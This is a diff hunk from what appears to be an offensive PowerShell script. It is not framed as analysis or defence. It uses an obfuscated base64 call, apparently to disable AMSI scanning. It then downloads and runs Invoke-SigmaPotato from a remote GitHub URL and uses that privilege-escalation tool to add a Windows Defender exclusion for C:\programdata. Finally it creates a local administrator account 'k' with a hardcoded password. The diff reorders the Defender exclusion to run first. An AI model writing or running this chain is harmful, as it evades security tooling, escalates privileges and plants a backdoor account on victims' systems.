@@ -75,6 +75,8 @@ $object = [Ref].Assembly.GetType(([System.Text.Encoding]::UTF8.GetString([System
 $Uninitialize = $object.GetMethods(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Tg==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('b25QdQ==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YmxpYyxzdA==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YXQ=')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWM=')))) | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
+Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
 Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "net localgroup administrators k /add"
-Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
+
+
